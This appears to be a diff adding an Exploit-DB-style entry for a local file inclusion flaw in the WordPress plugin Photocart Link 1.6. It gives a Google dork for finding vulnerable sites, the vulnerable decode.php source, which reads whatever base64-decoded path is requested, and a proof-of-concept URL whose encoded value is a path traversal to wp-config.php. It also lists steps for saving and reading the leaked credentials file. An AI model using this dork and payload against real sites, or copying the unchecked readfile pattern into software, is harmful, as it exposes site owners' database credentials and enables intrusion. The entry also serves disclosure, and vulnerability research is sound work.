@@ -1,0 +1,26 @@
+# Exploit Title: Wordpress Plugin Photocart Link - Local File Inclusion
+# Exploit Author: CrashBandicot @DosPerl
+# Date: 2016-03-27
+# Google Dork : inurl:/wp-content/plugins/photocart-link/
+# Vendor Homepage: https://fr.wordpress.org/plugins/photocart-link/
+# Tested on: MSWin32
+# Version: 1.6
+
+# Vuln file : decode.php
+
+<?php
+error_reporting(0);
+header("Cache-control: private"); 
+$new =  base64_decode($_REQUEST['id']);
+header("Content-type: image/jpeg");
+header("Content-transfer-encoding: binary\n"); 
+header("Content-Disposition: filename=do_not_copy_these_images");
+header('Cache-control: no-cache');
+@readfile($new);
+?>
+
+# PoC : /wp-content/plugins/photocart-link/decode.php?id=Li4vLi4vLi4vd3AtY29uZmlnLnBocA==
+
+# Right click -> Save As -> and Read with Notepad file Saved
+
+# 27/03/2016 - Vendor Informed about Issues
